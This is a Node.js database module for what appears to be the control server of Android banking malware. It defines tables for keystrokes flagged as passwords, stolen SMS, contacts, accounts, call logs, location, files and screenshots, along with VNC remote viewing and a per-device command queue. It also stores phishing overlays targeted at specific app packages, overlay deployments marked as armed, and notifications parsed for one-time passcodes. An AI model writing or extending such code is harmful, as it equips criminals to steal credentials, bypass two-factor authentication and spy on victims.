'use strict';
const sqlite3 = require('sqlite3').verbose();
const path    = require('path');
const fs      = require('fs');

const DB_PATH = process.env.DB_PATH || path.join(__dirname, '../data/nexus.db');
fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });

const db = new sqlite3.Database(DB_PATH);

db.serialize(() => {
  // ── WAL mode + performance PRAGMAs ────────────────────────────────────────
  db.run(`PRAGMA journal_mode    = WAL`);
  db.run(`PRAGMA synchronous     = NORMAL`);
  db.run(`PRAGMA cache_size      = -32000`);   // ~32 MB page cache
  db.run(`PRAGMA temp_store      = MEMORY`);
  db.run(`PRAGMA mmap_size       = 268435456`); // 256 MB mmap
  db.run(`PRAGMA foreign_keys    = ON`);
  db.run(`PRAGMA auto_vacuum     = INCREMENTAL`);
  db.run(`PRAGMA page_size       = 4096`);      // must be set before first write
  db.run(`PRAGMA wal_autocheckpoint = 1000`);

  // ── Core: devices ─────────────────────────────────────────────────────────
  db.run(`CREATE TABLE IF NOT EXISTS devices (
    id            TEXT    PRIMARY KEY,
    alias         TEXT,
    first_seen    INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    last_seen     INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    online        INTEGER NOT NULL DEFAULT 0,
    info          TEXT    NOT NULL DEFAULT '{}',
    tags          TEXT    NOT NULL DEFAULT '[]',
    screen_w      INTEGER NOT NULL DEFAULT 1080,
    screen_h      INTEGER NOT NULL DEFAULT 1920,
    vnc_quality   INTEGER NOT NULL DEFAULT 50,
    vnc_active    INTEGER NOT NULL DEFAULT 0,
    fin_count     INTEGER NOT NULL DEFAULT 0,
    social_count  INTEGER NOT NULL DEFAULT 0
  )`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_dev_online ON devices(online)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_dev_seen   ON devices(last_seen DESC)`);

  // ── Events ────────────────────────────────────────────────────────────────
  db.run(`CREATE TABLE IF NOT EXISTS events (
    id     INTEGER PRIMARY KEY AUTOINCREMENT,
    ts     INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    dev_id TEXT    NOT NULL,
    type   TEXT    NOT NULL,
    data   TEXT
  )`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_evt_dev  ON events(dev_id)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_evt_ts   ON events(ts DESC)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_evt_type ON events(type)`);

  // ── Keylogs (with is_password flag) ──────────────────────────────────────
  db.run(`CREATE TABLE IF NOT EXISTS keylogs (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    ts          INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    dev_id      TEXT    NOT NULL,
    app         TEXT,
    pkg         TEXT,
    text        TEXT,
    is_password INTEGER NOT NULL DEFAULT 0
  )`);
  // Add is_password column to existing installs
  db.run(`ALTER TABLE keylogs ADD COLUMN is_password INTEGER NOT NULL DEFAULT 0`,
    () => { /* ignore if already exists */ });
  db.run(`CREATE INDEX IF NOT EXISTS idx_kl_dev  ON keylogs(dev_id)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_kl_ts   ON keylogs(ts DESC)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_kl_pkg  ON keylogs(pkg)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_kl_pass ON keylogs(is_password)`);

  // ── Device data blobs (one row per device) ────────────────────────────────
  db.run(`CREATE TABLE IF NOT EXISTS device_sms (
    dev_id TEXT PRIMARY KEY,
    ts     INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    data   TEXT    NOT NULL DEFAULT '[]'
  )`);
  db.run(`CREATE TABLE IF NOT EXISTS device_contacts (
    dev_id TEXT PRIMARY KEY,
    ts     INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    data   TEXT    NOT NULL DEFAULT '[]'
  )`);
  db.run(`CREATE TABLE IF NOT EXISTS device_apps (
    dev_id TEXT PRIMARY KEY,
    ts     INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    data   TEXT    NOT NULL DEFAULT '[]'
  )`);
  db.run(`CREATE TABLE IF NOT EXISTS device_accounts (
    dev_id TEXT PRIMARY KEY,
    ts     INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    data   TEXT    NOT NULL DEFAULT '[]'
  )`);

  // ── Call logs (new feature module) ────────────────────────────────────────
  db.run(`CREATE TABLE IF NOT EXISTS device_calls (
    dev_id TEXT PRIMARY KEY,
    ts     INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    data   TEXT    NOT NULL DEFAULT '[]'
  )`);

  // ── Location ─────────────────────────────────────────────────────────────
  db.run(`CREATE TABLE IF NOT EXISTS device_location (
    id       INTEGER PRIMARY KEY AUTOINCREMENT,
    dev_id   TEXT    NOT NULL,
    ts       INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    lat      REAL    NOT NULL,
    lng      REAL    NOT NULL,
    accuracy REAL,
    address  TEXT
  )`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_loc_dev ON device_location(dev_id)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_loc_ts  ON device_location(ts DESC)`);

  // ── Files ─────────────────────────────────────────────────────────────────
  db.run(`CREATE TABLE IF NOT EXISTS files (
    id     INTEGER PRIMARY KEY AUTOINCREMENT,
    ts     INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    dev_id TEXT    NOT NULL,
    name   TEXT,
    size   INTEGER,
    path   TEXT
  )`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_files_dev ON files(dev_id)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_files_ts  ON files(ts DESC)`);

  // ── Command queue ─────────────────────────────────────────────────────────
  db.run(`CREATE TABLE IF NOT EXISTS cmd_queue (
    id     INTEGER PRIMARY KEY AUTOINCREMENT,
    ts     INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    dev_id TEXT    NOT NULL,
    cmd    TEXT    NOT NULL,
    args   TEXT    NOT NULL DEFAULT '{}'
  )`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_queue_dev ON cmd_queue(dev_id)`);

  // ── App detections ────────────────────────────────────────────────────────
  db.run(`CREATE TABLE IF NOT EXISTS app_detections (
    dev_id   TEXT    NOT NULL,
    package  TEXT    NOT NULL,
    name     TEXT,
    category TEXT,
    type     TEXT,
    country  TEXT,
    detected TEXT    DEFAULT 'db',
    ts       INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    PRIMARY KEY (dev_id, package)
  )`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_det_dev ON app_detections(dev_id)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_det_cat ON app_detections(category)`);

  // ── Overlays ──────────────────────────────────────────────────────────────
  db.run(`CREATE TABLE IF NOT EXISTS overlays (
    id           TEXT    PRIMARY KEY,
    name         TEXT    NOT NULL,
    package_name TEXT    NOT NULL,
    app_name     TEXT,
    category     TEXT,
    html         TEXT    NOT NULL,
    auto_deploy  INTEGER NOT NULL DEFAULT 0,
    created_at   INTEGER NOT NULL DEFAULT (strftime('%s','now'))
  )`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_ov_pkg ON overlays(package_name)`);

  // ── Overlay deployments ──────────────────────────────────────────────────
  db.run(`CREATE TABLE IF NOT EXISTS overlay_deployments (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    dev_id     TEXT    NOT NULL,
    overlay_id TEXT    NOT NULL,
    package    TEXT    NOT NULL,
    armed_at   INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    status     TEXT    NOT NULL DEFAULT 'armed',
    UNIQUE(dev_id, overlay_id)
  )`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_dep_dev ON overlay_deployments(dev_id)`);

  // ── Screenshots ───────────────────────────────────────────────────────────
  db.run(`CREATE TABLE IF NOT EXISTS screenshots (
    id     INTEGER PRIMARY KEY AUTOINCREMENT,
    dev_id TEXT    NOT NULL,
    ts     INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    data   TEXT    NOT NULL
  )`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_ss_dev ON screenshots(dev_id)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_ss_ts  ON screenshots(ts DESC)`);

  // ── Notifications ─────────────────────────────────────────────────────────
  db.run(`CREATE TABLE IF NOT EXISTS notifications (
    id       INTEGER PRIMARY KEY AUTOINCREMENT,
    dev_id   TEXT    NOT NULL,
    ts       INTEGER NOT NULL DEFAULT (strftime('%s','now')),
    app      TEXT,
    package  TEXT,
    title    TEXT,
    text     TEXT,
    is_otp   INTEGER NOT NULL DEFAULT 0,
    otp_code TEXT
  )`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_notif_dev ON notifications(dev_id)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_notif_ts  ON notifications(ts DESC)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_notif_otp ON notifications(is_otp)`);

  // ── Periodic WAL checkpoint (keep WAL file small) ─────────────────────────
  setInterval(() => {
    db.run(`PRAGMA incremental_vacuum(100)`);
    db.run(`PRAGMA wal_checkpoint(PASSIVE)`);
  }, 5 * 60 * 1000); // every 5 minutes
});

// ── Promisified helpers ───────────────────────────────────────────────────────
const run = (sql, p = []) =>
  new Promise((res, rej) => db.run(sql, p, function(e) { e ? rej(e) : res(this); }));
const get = (sql, p = []) =>
  new Promise((res, rej) => db.get(sql, p, (e, r) => e ? rej(e) : res(r)));
const all = (sql, p = []) =>
  new Promise((res, rej) => db.all(sql, p, (e, r) => e ? rej(e) : res(r)));

module.exports = { db, run, get, all };
